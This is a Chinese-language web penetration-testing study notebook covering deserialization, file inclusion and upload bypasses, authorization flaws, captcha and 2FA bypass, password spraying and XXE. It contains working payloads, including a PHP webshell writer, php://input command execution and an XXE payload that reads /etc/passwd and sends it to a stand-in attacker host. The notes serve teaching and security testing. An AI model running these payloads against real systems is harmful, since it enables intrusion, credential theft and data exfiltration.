https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=escalation&colspec=ID+Type+Status+Priority+Milestone+Owner+Summary&cells=ids
https://vulners.com/
https://sploitus.com/
https://packetstormsecurity.com/
**searchsploit**
使用

```bash
# 常用命令searchsploit 搜索关键词  --exclude="不包含关键词"#Searchsploit trickssearchsploit "linux Kernel" #Examplesearchsploit apache mod_ssl #Other examplesearchsploit -m 7618 #Paste the exploit in current directorysearchsploit -p 7618[.c] #Show complete pathsearchsploit -x 7618[.c] #Open vi to inspect the exploitsearchsploit --nmap file.xml #Search vulns inside an nmap xml result
```





# web安全

**首先测试什么漏洞**
思路一：你应该根据网站的类型去鉴定最可能存在的漏洞是什么，比如社交最可能存在XSS、文件操作最可能存在包含上传或下载漏洞。根据你的猜想首先去测试最可能的网站的漏洞。
思路二：根据你想要的结果来选，如想要webshell首先尝试的就是sql注入等危害大的漏洞

## 中间人攻击

中间人就是黑客对通信进行拦截，当数据流到黑客手里将会被任由处置。

### HTTPS

#### CA证书欺骗

攻击难度：简单
通过DNS劫持和局域网的ARP欺骗或网关劫持，使用户访问到攻击者网站。攻击者为获得明文密码于是伪造一个CA证书。但用户访问时，这种伪造证书会弹出证书不可信。

#### SSL劫持

SSL劫持之后https将会降级到http
防御中间人攻击的方案通常基于一下几种技术

#### 防御

1.公钥基础建设PKI 使用PKI相互认证机制，客户端验证服务器，服务器验证客户端；
2.延迟测试
使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。

## 反序列化（对象注入）

序列化：将中对象、类、数组、变量、匿名函数等，转化为字符串 方便保存到数据库或者文件中（将状态信息保存为字符串）
反序列化： 将字符串保存为状态信息

### PHP序列化与反序列化

#### 无类

**准备知识**
PHP对象字符串后打印结果的意义，注意对int和string的输出是不一样的：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713182708648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**php序列化与反序列化相关函数**

```bash
对象转换为字符串/字符串转换为对象serialize()/unserialize()
```

unserialize（）在执行时如果传入的是非空，会调用苏醒函数__wakeup()
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713183229700.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713200413947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 有类

以下是php的一些常见魔法方法
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713192123547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
漏洞一般就是产生在魔法方法里，在魔法方法中执行危险函数。比如在析构函数里执行SQL语句查询


### JAVA序列化与反序列化

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713203116925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 序列化函数介绍

实现序列化的是ObjectOutputStream 类的 writeObject() 方法可以实现序列化，实现反序列化的是ObjectInputStream类的readObject() 方法用于反序列化。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713204541992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713205037237.png)


序列化的结果一般都会被进行再次编码，因为不进行编码就是乱码格式不便于开发者识别这是什么东西。序列化且编码后的格式以rO0AB开头的是：base64(序列化);以aced开头的是：HEX(序列化）




#### 工具

https://github.com/frohoff/ysoserial
ysoserial 工具会帮助你实现序列化，然后对方程序再调用反序列化去执行危险命令

当你在目标网站发现一串数据是以rO0AB开头的，你可以先寻找目标站点是否有反序列化操作，即看这个序列化结果是否能被执行成正常代码或正常值得显示。如果是那么你就可以利用ysoserial去生成一段危险的序列化代码即payload。生成之后按照指定的编码格式，看是base64还是HEX，将这payload与前面目标网站抓取到的rO0AB序列化数据包替换。



### 常见反序列化爆出漏洞

以下来自 https://blog.csdn.net/qq_36119192/article/details/90411169的总结
shiro反序列化：Shiro反序列化漏洞复现
weblogic反序列化：Weblogic相关漏洞
jboss反序列化：Jboss相关漏洞
struts2命令执行：Struts2漏洞检测和利用
fastjson反序列化：利用需要特定条件，不常用
jackson反序列化：利用需要特定条件，不常用
apache solr反序列化：

## 文件操作

文件包含
可读取文件或代码执行
文件删除
删除配置文件可破坏网站
删除安装锁可重装
文件解压
如果上传文件为 tar / tar.gz 类型，可以尝试构压缩包内文件名为../../../../xxx 的tar包
文件导出
如果是CSV 或者 Excel可以注意一下CSV注入

### 文件读取

带来危害

* 黑盒：目录遍历。读取系统敏感文件
* 白盒：sql读写函数:load_file()和into outfile/dumpfile


**写入**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705183450890.png)

写入需要结合前文所描述的后门怎么制作达到最好效果。



### 文件包含

将文件包含进去，调用指定文件的代码.这种漏洞也很好被确定，一般url包含形如file=1.txt的参数就可以疑似了。在进一步直接访问url/1.txt，如果返回的界面与带参数file=1.txt一样那么你就可以确认这是文件包含了 
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712150822393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


文件包含的写法

```bash
<!--#include file="1.asp" --><!--#include file="top.aspx" --><c:import url="http://thief.one/1.jsp"><jsp:include page="head.jsp"/><%@ include file="head.jsp"%><?php Include('test.php')?>
```

#### 本地文件包含

这类漏洞处理的两种方案，1进入你发现的敏感文件
2 上传木马到文件，然后进行文件读取
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712162319492.png)

**无限制包含**
类似于如下，直接执行命令就可以进行文件的读取。
http://127.0.0.1:8080/include.php?filename=1.txt
http://127.0.0.1:8000/include.php?filename=../../../www.txt

**有限制**
这个限制可能是filename=1.txt网页后端强制添加后缀如加上'.html'

加特殊符号如？或者%23
%00截断：条件：magic_quotes_gpc=Off php版本<5.3.4（条件比较严格，不太推荐）

```bash
filename=../../../www.txt%00
```

溢出截断：条件：windows，点号需要长于256；linux长于4096 。
因爲.对于文件尾巴命名而言是没什么意义的

> windows:1.txt/././././././././././././././././././././././././././././././././././././././././././././
> 或
> 1.txt......................................................................................................................................................................................

  

     linux：1.txt............................................................................................................................

#### 远程协议包含

远程包含的危害要比本地文件包含的危害要大。
当all_url_include是开启的，就可以执行远程.
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712153658277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
你所需要准备一个远程文件，可以是txt，只要里面包含有敏感代码,网站是什么语言，你就写什么语言的代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712154532580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

http://127.0.0.1:8080/iclude.php?filename=http://www.xiaodi8.com/readme.txt
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%20
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%23
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt? 

#### 何种协议流玩法

前面远程和本地都是通过漏洞扫描工具等测出来的，协议流方法才是真正手工测试的方案。
https://www.cnblogs.com/endust/p/11804767.html
http://127.0.0.1:8080/include.php?filename=php://filter/convert.base64-encode/resource=1.txt
http://127.0.0.1:8080/include.php?filename=php://input POST:<?php system('ver')?>
<?php fputs(fopen('s.php'，'w'),'<?php @eval($_POST[cmd])?>';?>
http://127.0.0.1:8000/include.php?filename=file:///D:/phpstudy/PHPTutorial/www/1.txt
http://127.0.0.1:8080/include.php?filename=data://text/plain,<?php%20phpinfo();?>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712160934174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### 防御

固定后缀
写固定比如后端只接受1.txt文件，其他一律不处理

### 文件下载


凡是网站有文件下载的功能都有可能发生漏洞。我们可以去分析下载链接和文件链接，已确定下载代码是在哪个目录。我们可以利用此漏洞下载敏感文件比如数据库配置等，也可以下载有价值的网站源码。
一般文件下载参数以post传递

**下载哪些文件**
配置文件（数据库，平台，各种等）

**其他可测**
测一下是否下载是未授权漏洞

### 文件上传漏洞

首先对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。

上传漏洞值用户能够上传恶意脚本即webshell，上传成功的原因要么出现在管理员未对文件本身命名做过滤，要么是本身源码存在的特性。


字典生成 https://github.com/c0ny1/upload-fuzz-dic-builder


一般测试时会先上传一个包含xss的html文件，看上传是否做了过滤

**经验**
上传参数名解析：明确那些东西能修改？
Contont-Disposition：一般可更改
Name：表单参数值，不能更改
Filename：文件名，可以更改

#### 利用

一般程序员都不会让你自己上传php的，上传最多的就是图像。
这时候你就需要配合其他漏洞才可以执行。

##### +解析漏洞

如果有解析漏洞，图像中代码就会被执行。常见的解析漏洞存在于

常见解析漏洞存在于

* IIS 5.x/6.0解析漏洞

> ①`/xx.asp/xx.jpg` xx.asp的目录将被解析
>
> 利用：创建/.asp文件夹；上传xx.jpg
> ②xx.asp;.jpg`:分号后面的不被解析
> 利用：上传xx.asp;.jpg


* Apache

> xx.php.uarepig.truee	解析文件是从右到左开始判断的，如果后缀名识别不了就会往左继续判断
>
> 利用：上传xx.php.uarepig.truee

* Nginx <8.03

> xx.php%00.jpg	截断
>
> 利用：上传xx.php%00.jpg

* 配置不当.htaccess

> 写入`AddType application/x-httpd-php .jpg`	服务器允许客户端上传该文件
> 利用：上传xx.jpg

* 配置不当IIS 7.0/IIS 7.5/ Nginx <8.03/lighttpd  

>前提：只支持php脚本php.ini中的参数cgi.fix_pathinfo。这是配置不当引起的
>xx.jpg/.php
>利用：上传xx.jpg
>访问xx.jpg/.php

图片马制作很简单，你可以轻松的上传它，但是如何执行起来就是另一项技术。
生成在同级文件下放入一句话木马和图，将其在win的cmd下输入

```bash
copy 1.jpg /b+1.php/a 1.jpg
```

##### +文件包含漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135206289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135133834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)









#### 逻辑漏洞

* 前端验证Content-Type值判断的，这时候比如服务器只能允许上传image/jpeg，那么上传了php后，通过burpsuite拦截，可以看到content-type变为了application/octet-stream，在加上content-Type改为image/jpeg就能完成上传。这种方法绝大多数行不通。
* 前端JS检测绕过，JS前端都可以看到防御函数的，可以用此方法。当然如果文件从前端过来后，后端仍旧对格式有上传后缀名判断，就行不通的

* 竞态条件上传，一般存在二次渲染就是当系统收到用户上传的图片时，先进行保存到服务器，或者是为了方便用户进行图片的删除或者改大小。这通常就涉及到两次保存，一般程序员在保存第一次时可能疏忽不会写冗长的代码来过滤。
  只要成功保存一次，对于我们其实就够了，利用竞态，在文件被服务器删除之前访问。这时候对于系统来说就是打开了文件，打开就不能进行删除了。你制造竞态只需要不断请求修改数据包即可。启动爆破后，打开网页对php进行多次刷新访问，如果弹出一串奇怪的代码那就说明你已经执行成功了。这时候你要做的就是停止再刷新界面，将此界面保持就可以进行后门操作
  *

##### 常规上传

**windows特性**
Windows不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动取出，所以可以使用 xx.php[空格] ， xx.php.， xx.php/， xx.php::$DATA 可以上传脚本文件

**过滤不充分**

* 代码替换关键字

>递归过滤
>a.pphphp -> a.

以下字典是我根据本文的方法进行的初步总结，但这样的字典明显太小，你需要用网上公开的fuzz字典，推荐一个 https://github.com/c0ny1/upload-fuzz-dic-builder

```bash
. ::$$DATA.php3.php5. ..pphphp%00.jpg.PHp3%00.jpg/.jpg;.jpg.xxx;.php.p\nh\np
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709192845136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


### 文件删除

文件删除黑盒测试很难看到一般都是白盒测试。因为你要删除文件很难用到特定的函数去执行。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717211623270.png)

unlink，delfile是php中对应删除的函数
删除数据库安装文件，可以重装数据库。

## CORS

如果在请求的数据包中有
origin修改后，在返回的数据包中有：
![在这里插入图片描述](https://img-blog.csdnimg.cn/955272a4338a4b7c83b63183f3205e1d.png)
就说明有此漏洞。在测试时需要搭建一个vps，

## 业务层面漏洞

### 模块


### 方式

#### 无限制回退

比如修改密码，回退之后还是可以修改额

#### 未授权访问

通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。

#### 竞态

即利用对方在
检测函数执行前不断访问资源造成的漏洞；
常见漏洞：文件上传绕过检测、购买物品余额查询绕过检测

#### 越权

越权测试可以使用burpsuite的Autoz插件，或手动测试（两个不同浏览器或一个开无痕的浏览器）在测试越权通常需要你建立两套不同的账户
用户的授权过程是先检测账户名和密码或session等是不是对应得上，对应得上在根据用户的组给予相应权限。这里如果权限控制未设置准确就存在越权漏洞。


水平越权：通过更换的某个ID之类的身份标识，从而使A账号获取(修改、删除等)B账号数据

垂直越权：使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。

##### 越权测试

**手动常见修改参数**
uid、用户名、cookie的uid、电话号

**工具测试**
burpsuite插件 Authz
[burpsuite功能compare site](https://blog.csdn.net/blood_pupil/article/details/90543849) 

##### 防御

1.前后端同时对用户输入信息进行校验，双重验证机制
2.调用功能前验证用户是否有权限调用相关功能
3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限
4.直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理
5.永远不要相信来自用户的输入，对于可控参数进行严格的检测与过滤

## 开放性

## 登录脆弱

**登录类型**
在多个系统中，用户只需一次登录，各个系统即可感知该用户已经登录。比如阿里系的淘宝和天猫，很明显地我们可以知道这是两个系统，但是你在使用的时候，登录了天猫，淘宝也会自动登录。

### 漏洞类型

* 开放性跳转（high）

> 登录成功通常都有跳转

* 密码明文或可被识别出的加密算法

> 登录成功通常都有跳转

* 用户密码可被枚举

> 提示用户名错误
> 无验证码或可绕过，ip不封锁

* 自动登录参数暴露敏感信息（info）

 > 看参数值可以被验证是某框架

* 会话固定

> 登陆前通过软件工具抓取到的cookie信息值与在登录后抓取到的cookie进行对比，如果其值一样，则可判断其会话的cookies或者sessions未进行更新

### 验证脆弱


#### 开发者不严谨

主要见于session覆盖和token规律性

token（登录者独立令牌）呈现规律性，常见的有时间戳、base64、md5加密
session覆盖：修改任意用户密码

> 用户A输入手机号验证成功后，于此同时打开另一个标签修改B用户的账号密码。这种方式类似于账号覆盖

##### 验证码破解

**旧型**

验证码分为字符验证码，滑动，人机设备检测

现在更常见的验证码会在用户输入3-5次后出现

**新型**

语音验证码--将一段语言发送到手机



现在验证码绕过更难了，可能在5年后字符型验证码已经不怎么存在了。但是对于新型验证码还没有与时共进的绕过方案。


###### 弱验证码绕过

**观察**
验证码破解你首先要仔细观察数据包，且要分别尝试对方网站收到正确的验证码和错误的验证码时，网站的返回差异。并获得相关攻破点，比如长度太短等

**方法**
验证码不刷新

验证码抓包绕过：验证码明文显示在数据包中

验证码复用

验证码删除绕过：

验证码置空绕过

验证码过于简单：验证码直接爆破。一般四位数验证码一万次就爆破出来了，大概需要一分钟，六位数验证码也就十分钟左右，有的验证存活时期能达到10分钟以上的，就可以测试。

修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP
账号后加空格绕过账号错误次数限制。

修改回显：看是否能直接跳转到请求成功的界面。有的网站直接跳转是根据是否验证成功的状态码，比如当验证成功后网页返回1，失败返回0.服务器接收到1就会直接显示登录成功的网页，如果对方以此为校对这就会产生相应漏洞。这可以用burpsuite的相应到当前请求来做修改
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713135502447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

###### 识别绕过

有的验证码数据包进行了一次修改，验证码就变更了，这时候就需要做识别绕过

字符验证码：

【破解思路】：人工智能/打码平台

滑动验证码：

【破解思路】：底图对比+模拟人滑动速度/打码平台

注册极验api收集全部底图，做自动化对比破解、


**打码平台**

http://www.114sim.com/
https://yunduanxin.net/China-Phone-Number/
https://www.materialtools.com/


**工具**
captcha-killer：
https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713150556748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

reCAPTCHA等



#### 登陆点暴力破解

##### 社工字典

你可以从以下几个设计思路入手：
月份和年份的数字组合
电话
姓名
生日
查看一些以前泄露出来的数据，找一些有没有目标公司的用户资料泄露，因为相同公司的用户可能会使用类似的密码。
公司名称+年份/编号/特殊的字符 (如!,$,#,@）



**搜集更多信息以及生成他们字典**
https://whois.domaintools.com
http://whois.chinaz.com/
密码爆破如此
whois 查询到所登记的联络人信息，通常是网域管理员，收集他的**个人邮箱**作为密码爆破猜解对象之一。


推荐crunch和cupp，kali中都有，自己也可以根据需要写一些脚本

很多大佬都有几十个G的密码爆破字典，但大家在网上真的很难搜得到，搜得到的大多都是那些随机生成的密码，不具有意义。
在线字典生成器
https://www.bugku.com/mima/


首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool
爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章:
https://xz.aliyun.com/t/7823

#### 常见攻击方法

##### 暴力破解

要是获得已知用户名的hash密码也能破解，具体做法是通过hashid识别hash类型，将用户名和你尝试的密码一一结合起来看是否hash值相等，相等即破解成功。这两种方法都是属于暴力破解，只不过一个是在线的一个是离线的，你仍旧都可以使用hydra破解


**hydra进行暴力破解**

hydra爆破工具，在kali有集成。在kali上有个默认密码字典位于`/usr/share/wordlists`


类似工具：snetcrack、超级弱口令




##### 密码喷洒攻击

基本上，密码爆破是用多个密码尝试破解同一个 ID。而密码喷洒攻击，是用一个密码来尝试多个用户ID，以便至少有一个用户 ID 被泄露。对于密码喷洒攻击，黑客使用社交工程或其他网络钓鱼方法收集多个用户 ID。通常情况下，至少有一个用户使用简单的密码，如12345678甚至是 p@ssw0rd。在密码喷洒攻击中，黑客会为他或她收集的所有用户 ID 应用精心构造的密码。因此，密码喷洒攻击可以定义为将相同的密码应用于组织中的多个用户帐户，目的是安全的对其中一个帐户进行未授权访问。暴力破解的问题在于，在使用不同密码进行一定次数的尝试后，系统可能会被锁定。为了避免这种情况，产生了收集用户 ID 并将可能的密码应用于它们的想法。使用密码喷洒攻击时，黑客也会采取一些预防措施。
工具：spray官网地址	http://bit.ly/2EJve6N
使用方法

```bash
spray.sh -owa <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain>
```

ruler有spray类似的功能，但更多的利用ruler获得密码后可以利用此工具做钓鱼文件等https://github.com/sensepost/ruler

##### 获得登录凭证的下一步

破坏邮箱，发送恶意脚本的工具
https://github.com/O365/python-o365
该项目旨在以 Pythonic 的方式轻松地与 Microsoft Graph 和 Office 365 进行交互。访问电子邮件、日历、联系人、OneDrive 等。很容易以一种对初学者来说简单而直接的方式进行，对经验丰富的 Python 程序员来说感觉恰到好处。

#### 防御与绕过方法

 - 服务器端没有做限制，而比如银行卡号密码就做了限制，如果试错次数超过3，那么卡将被冻结，所以一般黑客是会收集多个账号
 - 没有做登录验证或被验证能被绕过
 - 双因素验证，趋势。但是很多网站只对他知名的站点做双因素，而古老的却不加防御
- 明文传输或加密方式被你破解，其中大部分http都是明文传输，大部分https都是加密传输

##### 待补充：AI破解

##### 绕过双因素验证

双因素验证是个机巧的系统，难以正确实现。当你注意到站点使用了它时，你需要完整
测试所有功能，包括 Token 的生命周期（如果站点管理员没有实现速率限制，就依靠于爆破），尝试的最大次数，复用过期的 Token，猜测Token 的可能性，以及其他。
你也可以结合钓鱼来绕过。钓鱼即通过伪造页面截取用户的请求，用模拟软件来将用户的请求反馈到真实网站中，进而完成登录
ReelPhish，https://github.com/fireeye/ReelPhish
还有一些其他工具可以处理不同的双因素验证绕过的情境：

https://github.com/kgretzky/evilginx
https://github.com/ustayready/CredSniper








## XML 外部实体 (XXE) 注入

### 背景：什么是XML？

XML 指可扩展标记语言（EXtensible Markup Language），它是用于存储和传输数据的最常用的语言

**与HTML区别**
它是用来对HTML的补充，HTML只能定义数据的展示，而XML能定义数据的组织。XML是一种自我描述语言。
它不包含任何预定义的标签，如 <p>、<img> 等。所有标签都是用户定义的，具体取决于它所代表的数据。<email></email>、<message></message> 等

### 什么是 XML 外部实体注入？

XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，**没有禁止外部实体的加载，如果禁止了就是合规的xml文件**，导致可加载恶意外部文件和代码，具体来说是XML的DTD会定义实体部分，实体部分对于XML就像是变量，**但他不仅是变量，还可以用来调用本地文件1.txt或外部实体https://baidu.com**。正因为这里实体有这么强大的功能，因此也容易被攻击。常见的攻击有任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。

### XXE 漏洞怎么验证？

XXE漏洞出现在包含xml的文件，对于现实世界的 XXE 漏洞，提交的 XML 中通常会有大量数据值，其中任何一个都可能在应用程序的响应中使用。要系统地测试 XXE 漏洞，您通常需要单独测试 XML 中的每个数据节点，方法是使用您定义的实体并查看它是否出现在响应中。
如下是一份含xml的请求，案例来自[靶场](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)在原始的xml文件中你需要增加你的恶意payload，并调用该变量。具体变量调用在productId还是storeId之间需要手动测试。

```bash
POST /product/stock HTTP/1.1Host: ac391f291f66563c80495011008200db.web-security-academy.netConnection: closeContent-Length: 107Origin: https://ac391f291f66563c80495011008200db.web-security-academy.netUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36Content-Type: application/xmlAccept: */*Referer: https://ac391f291f66563c80495011008200db.web-security-academy.net/product?productId=2Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: session=hpqccPz9SimfThZLsXhO4Sa4xkDXHRRJ<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```

### XXE 攻击有哪些类型？

有多种类型的 XXE 攻击：

利用 XXE 来检索 files，其中定义了一个包含文件内容的外部实体，并在应用程序的响应中返回。
利用 XXE 执行 SSRF 攻击，其中根据后端系统的 URL 定义外部实体。
利用盲 XXE 带外数据泄露，敏感数据从应用服务器传输到攻击者控制的系统。
利用盲XXE通过错误消息检索数据，攻击者可以在其中触发包含敏感数据的解析错误消息。

#### 利用XXE检索文件 

```bash
# 读取服务器密码## 情况1：有回显<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo （foo取名任意） [<!ELEMENT foo ANY 其他任意实体 ><!ENTITY xxe（变量名） SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>## 情况2：无回显（+远程）<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///etc/passwd" >#将文件内容作为参数发送到黑客服务器<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">]><foo>&callhome;</foo>
```

无回显补充：

如果目标站点没有回显，就将目标站点的文件直接请求到自己服务器
注意这里额外多使用了个base64加密是因为这是php文件读取的方法，php读取文件就不必在写全目录了(当然写全也无可厚非，如下图就是写全的)，如果是同级目录下就是test.txt
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714124614593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
请求的数据包要打开自己服务器看日志才能读取。这里写入到自己服务器理论上应该也可以，但是没有看到XML语言支持写入的 。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714131106544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


#### 利用XXE进行SSRF攻击？

利用XXE进行SSRF攻击，可以诱导服务器端应用程序向服务器可以访问的任何 URL 发出 HTTP 请求。

要利用 XXE 漏洞执行SSRF 攻击，您需要使用要定位的 URL 定义外部 XML 实体，并在数据值中使用定义的实体。如果您可以在应用程序响应中返回的数据值中使用定义的实体，那么您将能够从应用程序响应中的 URL 查看响应，从而获得与后端系统的双向交互。如果没有，那么您将只能执行盲目的 SSRF攻击（这仍然会产生严重的后果）。

在以下 XXE 示例中，外部实体将导致服务器向组织基础架构内的内部系统发出后端 HTTP 请求：

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>



#### XXE 亿笑攻击-DOS

第一次进行这种攻击时，攻击者使用lol作为实体数据，并在随后的几个实体中多次调用它。执行时间呈指数级增长，结果是一次成功的 DoS 攻击导致网站瘫痪。由于使用 lol 并多次调用它导致了数十亿个请求，我们得到了“Billion Laugh Attack”这个名字
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604115827776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
在这里，我们看到在1 处，我们已经声明了名为“ ignite”的实体，然后在其他几个实体中调用了 ignite，从而形成了一个回调链，这将使服务器过载。在2 处，我们调用了实体&ignite9; 我们已经调用 ignite9 而不是 ignite，因为 ignite9 多次调用 ignite8，每次调用 ignite8 时都会启动 ignite7，依此类推。因此，请求将花费指数级的时间来执行，结果，网站将关闭。
以上命令导致 DoS 攻击，我们得到的输出是：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604115949948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


### 寻找 XXE 注入的隐藏攻击面

#### 前端数据没有定义DOCTYPE

一些应用程序接收客户端提交的数据，在服务器端将其嵌入到 XML 文档中，然后解析该文档。当客户端提交的数据被放入后端 SOAP 请求，然后由后端 SOAP 服务处理时，就会发生这种情况。

在这种情况下，您无法执行经典的 XXE 攻击，因为您无法控制整个 XML 文档，因此无法定义或修改DOCTYPE元素。但是，您也许可以XInclude改用。XInclude是 XML 规范的一部分，它允许从子文档构建 XML 文档。您可以XInclude在 XML 文档中的任何数据值中放置攻击，因此可以在您只控制放置在服务器端 XML 文档中的单个数据项的情况下执行攻击。

要执行XInclude攻击，您需要引用XInclude命名空间并提供要包含的文件的路径。例如：

```bash
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

#### 允许上传特定文件，无xml在前端回显

一些常见的文件格式使用 XML 或包含 XML 子组件。如下：
**图像格式**
指SVG
SVG包含XML，攻击者可以提交恶意的 SVG 图像，如下将svg编辑为以下内容从而达到 XXE 漏洞的隐藏攻击面。

```bash
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

**文件格式**
如果网站允许上传 .docx  .xlsx  、 .pptx  文件，其实本质只是个 XML 文件的压缩包。
创建了一个 .docx (或其他x) 文件以及图像格式（如 ），并使用 7zip 打开它来提取内容，并将下面的载荷插入了一个 XML 文件中

```bash
